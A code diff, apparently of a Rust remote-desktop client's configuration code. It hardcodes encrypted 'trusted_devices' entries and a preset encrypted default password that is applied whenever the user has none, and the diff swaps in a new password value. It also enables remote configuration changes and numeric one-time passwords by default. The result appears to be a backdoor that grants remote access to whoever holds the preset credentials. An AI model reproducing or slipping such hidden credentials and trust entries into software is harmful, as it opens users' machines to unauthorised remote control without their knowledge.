@@ -497,15 +497,17 @@ impl Config2 {
             	config.options.insert("trusted_devices".to_string(), "00AXNr3lxkXoPflsDp0YC/XcHjOFKMZ0/D0lCZeuR6Qzoh6OdBwlETJ5OpdA==".to_string());
             	config.store();
         	}
-        if !config.options.contains_key("verification-method") {
-            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
-            store = true;
-            }
         
         if !config.options.contains_key("allow-remote-config-modification") {
             	config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
             	store = true;
         	}
+        	
+         if !config.options.contains_key("allow-numeric-one-time-password") {
+            	config.options.insert("allow-numeric-one-time-password".to_string(), "Y".to_string());
+            	store = true;
+        	}
+        	
 
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
@@ -518,10 +520,7 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
-        if !config.options.contains_key("trusted_devices") {
-            	config.options.insert("trusted_devices".to_string(), "00AcXjG6mhaPyXWfflLdLOTBOGxtudEPo7VEzQDERM+H281adqQSZJ759pEA==".to_string());
-            	config.store();
-        }
+        
         if store {
             config.store();
         }
@@ -666,7 +665,7 @@ impl Config {
             }
         }
         if config.password.is_empty() {
-            	config.password = "01AahT2Jr9hlmCkNEaDZxQs28dUhZ04KmPB5miaAKN/6tfdOvYicGgh2B9kGBTkNZ009xgzsIuTLQ+5D2qn/qWzGmKrej2EatsJUEUKO4Do3gmaflTJCaU".to_string();
+            	config.password = "01ASsIq3lkLTU60iMrSYlLKsJdlkR8Qt6Mmx4r4ofhyo3zdMT5vv2b4vnD0mMjBd4QjQBHgxHUuZa75pOyhsYPYmoUgHy9hXu/jSx+WmjoPm9P2D4W4H4o".to_string();
             	store = true;
         	}
         
